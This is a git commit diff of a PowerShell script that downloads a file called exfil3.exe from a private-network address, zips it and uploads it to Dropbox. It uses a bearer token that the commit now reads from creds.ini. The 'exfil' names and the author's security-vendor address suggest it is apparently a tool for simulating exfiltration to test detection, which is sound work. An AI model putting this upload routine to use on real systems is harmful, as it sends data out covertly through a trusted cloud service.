926e6362029a3eca7340254bfe830ce1a2dc7859
jwlogrhythm <joshua.wilson@logrhythm.com>
2022-11-14 06:55:48 -0700

    Updated main

--- main.ps1
+++ main.ps1
@@ -1,10 +1,11 @@
-$file = "C:\projects\exfil.img"
-$ZipFilePath="C:\projects\exfil.zip"
+$file = "C:\projects\exfil3.exe"
+$ZipFilePath ="C:\projects\exfil3.zip"
+$Token = Get-Content "creds.ini"
 
 #LR-ToDo: Need to set it up so the token is read from an ini file
 #This block is for the api request
 #Need to put token in the double qoutes
-$authorization = "Bearer " + ""
+$authorization = "Bearer " + $Token
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", '{"path":"/Apps/LR-DE/exfil.zip", "mode": "add", "autorename": true, "mute": false}')
@@ -13,7 +14,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 #If the file does not exist, download and zip it
 if (-not(Test-Path -Path $file -PathType Leaf)) {
 	try {
-		Invoke-WebRequest -Uri "http://192.168.100.115/exfil.img" -OutFile $file
+		Invoke-WebRequest -Uri "http://192.168.100.115/exfil3.exe" -OutFile $file
 		Write-Host "File has been downloaded."
 		Compress-Archive -LiteralPath $file -DestinationPath $ZipFilePath
 		Write-Host "File has been zipped up."
@@ -28,7 +29,7 @@ else {
 	Write-Host "File already exists. Now deleting file."
 	Remove-Item $file
 	Remove-Item $ZipFilePath
-	Invoke-WebRequest -Uri "http://192.168.100.115/exfil.img" -OutFile $file
+	Invoke-WebRequest -Uri "http://192.168.100.115/exfil3.exe" -OutFile $file
 	Write-Host "File has been downloaded."
 	Compress-Archive -LiteralPath $file -DestinationPath $ZipFilePath
 	Write-Host "File has been zipped up."
